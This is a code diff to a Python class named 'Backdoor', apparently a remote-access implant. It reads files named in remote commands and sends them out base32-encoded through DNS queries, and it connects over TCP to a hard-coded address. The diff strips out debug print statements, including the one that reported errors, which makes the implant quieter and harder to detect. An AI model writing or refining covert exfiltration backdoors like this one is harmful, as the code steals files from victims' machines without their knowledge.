@@ -126,7 +126,6 @@ class Backdoor:
                 break
             resp.append(data[i:i+32])
         resp.append(base64.b32encode("#END#".encode()))
-        print(resp)
         for chunk in resp:
             encoded_chunk_str = str(chunk).strip("'b")
             self.dns_udp_handle(encoded_chunk_str)
@@ -164,7 +163,6 @@ class Backdoor:
     def dns_run(self, recv_data):
         if recv_data[0] == "download":
             buffer = None
-            print(recv_data)
             with open(recv_data[1], "rb") as obj:
                 buffer = obj.read()
             buffer = base64.b32encode(buffer)
@@ -191,5 +189,4 @@ try:
                         "192.168.1.41")
     backdoor.tcp_run()
 except Exception as e:
-    print(Exception, e)
     sys.exit(0)
